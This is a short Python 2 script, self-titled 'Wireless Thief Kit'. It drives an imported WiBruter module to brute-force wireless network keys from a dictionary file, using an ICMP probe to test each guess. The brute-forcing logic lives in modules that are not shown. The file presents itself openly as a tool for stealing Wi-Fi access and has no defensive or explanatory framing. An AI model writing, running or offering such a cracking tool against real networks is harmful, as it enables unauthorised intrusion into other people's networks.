#!/usr/bin/python

import sys
from wi import WiBruter
from probes import DhcpProbe, IcmpProbe


if __name__ == "__main__":
    try:
        interface = sys.argv[1]
        print "Wireless Thief Kit"
        bruter = WiBruter(interface)
        bruter.registerProbe(IcmpProbe)
        bruter.addDictionary("keys.lst")
        bruter.start()
    except:
        sys.stderr.write("*Error*: %s,%s\n" % (sys.exc_type, sys.exc_value))
        print "Usage: ", sys.argv[0], " [interface]\n"

